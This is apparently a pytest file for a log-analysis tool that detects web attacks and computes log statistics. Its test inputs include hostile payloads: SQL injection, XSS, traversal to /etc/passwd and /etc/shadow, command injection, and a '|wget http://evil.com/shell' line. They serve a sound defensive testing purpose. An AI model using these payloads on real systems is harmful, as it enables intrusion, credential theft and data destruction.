import pytest
from datetime import datetime
from logsentry.parser import LogEntry
from logsentry.analyzer import LogAnalyzer


def _make_entry(
    ip="192.168.1.1",
    path="/",
    status=200,
    user_agent="Mozilla/5.0",
    method="GET",
    timestamp=None,
):
    """Helper to quickly build LogEntry objects for tests."""
    if timestamp is None:
        timestamp = datetime(2026, 3, 15, 8, 0, 0)
    return LogEntry(
        ip=ip,
        timestamp=timestamp,
        method=method,
        path=path,
        status=status,
        size=100,
        referrer="-",
        user_agent=user_agent,
        raw=f'{ip} - - "GET {path} HTTP/1.1" {status}',
    )


class TestSQLInjectionDetection:
    def test_union_select(self):
        entries = [_make_entry(ip="10.0.0.1", path="/products?id=1+UNION+SELECT+password+FROM+users")]
        result = LogAnalyzer().analyze(entries)

        sqli = [t for t in result.threats if t.category == "SQL Injection"]
        assert len(sqli) == 1
        assert sqli[0].severity == "CRITICAL"
        assert sqli[0].source_ip == "10.0.0.1"

    def test_or_1_equals_1(self):
        entries = [_make_entry(path="/login?user='+OR+1=1--")]
        result = LogAnalyzer().analyze(entries)

        sqli = [t for t in result.threats if t.category == "SQL Injection"]
        assert len(sqli) >= 1

    def test_normal_query_not_flagged(self):
        entries = [_make_entry(path="/products?id=42&sort=price")]
        result = LogAnalyzer().analyze(entries)

        sqli = [t for t in result.threats if t.category == "SQL Injection"]
        assert len(sqli) == 0


class TestXSSDetection:
    def test_script_tag(self):
        entries = [_make_entry(ip="10.0.0.5", path="/search?q=<script>alert(1)</script>")]
        result = LogAnalyzer().analyze(entries)

        xss = [t for t in result.threats if "XSS" in t.category]
        assert len(xss) == 1
        assert xss[0].severity == "HIGH"

    def test_event_handler(self):
        entries = [_make_entry(path="/profile?name=<img+onerror=alert(1)>")]
        result = LogAnalyzer().analyze(entries)

        xss = [t for t in result.threats if "XSS" in t.category]
        assert len(xss) >= 1

    def test_normal_html_entity_not_flagged(self):
        entries = [_make_entry(path="/search?q=hello+world")]
        result = LogAnalyzer().analyze(entries)

        xss = [t for t in result.threats if "XSS" in t.category]
        assert len(xss) == 0


class TestTraversalDetection:
    def test_dot_dot_slash(self):
        entries = [_make_entry(path="/files/../../../../etc/passwd")]
        result = LogAnalyzer().analyze(entries)

        trav = [t for t in result.threats if t.category == "Directory Traversal"]
        assert len(trav) >= 1

    def test_encoded_traversal(self):
        entries = [_make_entry(path="/download?file=%2e%2e%2f%2e%2e%2fetc/shadow")]
        result = LogAnalyzer().analyze(entries)

        trav = [t for t in result.threats if t.category == "Directory Traversal"]
        assert len(trav) >= 1


class TestCommandInjection:
    def test_semicolon_cat(self):
        entries = [_make_entry(path="/api/ping?host=;cat+/etc/passwd")]
        result = LogAnalyzer().analyze(entries)

        cmd = [t for t in result.threats if t.category == "Command Injection"]
        assert len(cmd) == 1
        assert cmd[0].severity == "CRITICAL"

    def test_pipe_wget(self):
        entries = [_make_entry(path="/run?cmd=|wget+http://evil.com/shell")]
        result = LogAnalyzer().analyze(entries)

        cmd = [t for t in result.threats if t.category == "Command Injection"]
        assert len(cmd) >= 1


class TestBruteForceDetection:
    def test_many_failed_logins(self):
        # simulate 15 failed login attempts from the same IP
        entries = [
            _make_entry(ip="10.0.0.99", path="/login", status=401, method="POST",
                        timestamp=datetime(2026, 3, 15, 9, 0, i))
            for i in range(15)
        ]
        result = LogAnalyzer(brute_force_threshold=10).analyze(entries)

        bf = [t for t in result.threats if t.category == "Brute Force"]
        assert len(bf) == 1
        assert bf[0].count == 15

    def test_below_threshold_not_flagged(self):
        entries = [
            _make_entry(ip="10.0.0.99", path="/login", status=401)
            for _ in range(3)
        ]
        result = LogAnalyzer(brute_force_threshold=10).analyze(entries)

        bf = [t for t in result.threats if t.category == "Brute Force"]
        assert len(bf) == 0

    def test_custom_threshold(self):
        entries = [
            _make_entry(ip="10.0.0.99", status=401)
            for _ in range(5)
        ]
        # threshold set to 5, so exactly 5 should trigger
        result = LogAnalyzer(brute_force_threshold=5).analyze(entries)
        bf = [t for t in result.threats if t.category == "Brute Force"]
        assert len(bf) == 1


class TestScannerDetection:
    def test_nikto(self):
        entries = [_make_entry(user_agent="Nikto/2.1.6")]
        result = LogAnalyzer().analyze(entries)

        scan = [t for t in result.threats if t.category == "Automated Scanner"]
        assert len(scan) == 1

    def test_sqlmap(self):
        entries = [_make_entry(user_agent="sqlmap/1.7.2")]
        result = LogAnalyzer().analyze(entries)

        scan = [t for t in result.threats if t.category == "Automated Scanner"]
        assert len(scan) == 1

    def test_normal_browser_not_flagged(self):
        entries = [_make_entry(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0")]
        result = LogAnalyzer().analyze(entries)

        scan = [t for t in result.threats if t.category == "Automated Scanner"]
        assert len(scan) == 0


class TestSensitivePathDetection:
    def test_env_file(self):
        entries = [_make_entry(path="/.env")]
        result = LogAnalyzer().analyze(entries)

        sens = [t for t in result.threats if t.category == "Sensitive Path Access"]
        assert len(sens) >= 1

    def test_git_config(self):
        entries = [_make_entry(path="/.git/config")]
        result = LogAnalyzer().analyze(entries)

        sens = [t for t in result.threats if t.category == "Sensitive Path Access"]
        assert len(sens) >= 1

    def test_wp_admin(self):
        entries = [_make_entry(path="/wp-admin/")]
        result = LogAnalyzer().analyze(entries)

        sens = [t for t in result.threats if t.category == "Sensitive Path Access"]
        assert len(sens) >= 1


class TestAnalysisStats:
    def test_empty_list(self):
        result = LogAnalyzer().analyze([])
        assert result.total_entries == 0
        assert result.total_threats == 0

    def test_basic_stats(self):
        entries = [
            _make_entry(ip="1.1.1.1", status=200),
            _make_entry(ip="1.1.1.1", status=200),
            _make_entry(ip="2.2.2.2", status=404),
        ]
        result = LogAnalyzer().analyze(entries)

        assert result.total_entries == 3
        assert result.unique_ips == 2
        assert result.status_distribution[200] == 2
        assert result.status_distribution[404] == 1

    def test_error_rate_calculation(self):
        entries = [
            _make_entry(status=200),
            _make_entry(status=200),
            _make_entry(status=500),
            _make_entry(status=404),
        ]
        result = LogAnalyzer().analyze(entries)
        # 2 out of 4 are errors (500 and 404)
        assert result.error_rate == 50.0

    def test_severity_counts(self):
        # feed it one SQLi (CRITICAL) and one scanner (MEDIUM)
        entries = [
            _make_entry(path="/search?q='+OR+1=1--"),
            _make_entry(user_agent="Nikto/2.1.6"),
        ]
        result = LogAnalyzer().analyze(entries)

        counts = result.severity_counts
        assert counts["CRITICAL"] >= 1
        assert counts["MEDIUM"] >= 1

    def test_groups_threats_by_ip(self):
        # multiple SQLi from same IP should be grouped into one threat
        entries = [
            _make_entry(ip="10.0.0.1", path="/a?id=1+UNION+SELECT+1"),
            _make_entry(ip="10.0.0.1", path="/b?id='+OR+1=1--"),
            _make_entry(ip="10.0.0.1", path="/c?x=;DROP+TABLE+users"),
        ]
        result = LogAnalyzer().analyze(entries)

        sqli = [t for t in result.threats if t.category == "SQL Injection"]
        assert len(sqli) == 1  # one threat, not three
        assert sqli[0].count == 3
